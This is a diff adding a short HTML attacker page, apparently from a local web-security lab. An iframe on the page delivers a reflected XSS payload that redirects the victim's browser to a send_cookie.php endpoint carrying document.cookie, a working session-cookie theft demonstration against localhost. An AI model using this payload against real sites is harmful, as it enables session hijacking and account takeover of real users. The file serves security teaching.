@@ -1,0 +1,9 @@
+<html>
+<head>
+<meta charset="utf-8"/>
+</head>
+<body>
+<p>以下に別のページを表示</p>
+<iframe width=320 height=100 src="http://localhost/websecurity/xss/steal_cookie.php?word=<script>window.location='http://localhost/websecurity/xss/send_cookie.php?sid='%2Bdocument.cookie;</script>"></iframe>
+</body>
+</html>
